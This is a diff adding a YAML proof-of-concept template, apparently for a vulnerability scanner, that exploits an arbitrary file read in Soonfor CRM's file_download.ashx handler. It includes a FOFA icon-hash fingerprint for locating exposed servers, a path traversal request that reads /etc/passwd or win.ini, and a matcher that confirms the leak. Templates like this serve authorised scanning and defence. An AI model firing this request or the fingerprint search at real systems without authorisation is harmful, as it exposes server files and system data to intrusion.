@@ -1,0 +1,21 @@
+id: poc-yaml-soonfor-crm-file-download-ashx-anyfile-read
+info:
+  name: 数夫CRM客户关系管理系统 file_download.ashx 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 数夫CRM客户关系管理系统
+  fofa: icon_hash="-244202779"
+variables:
+  paths: 'C:/Windows/win.ini
+
+    /etc/passwd
+
+    '
+requests:
+- method: GET
+  path: /Web/common/Handler/file_download.ashx?filepath={{.paths}}
+  expression: (status_code == 200 && contains(content_type,"application/octet-stream"))
+    && ( (contains(body,"root:") && contains(body,"/bin")) || (contains(body,"[files]")
+    && contains(body,"bit app support")) )
+transport: http
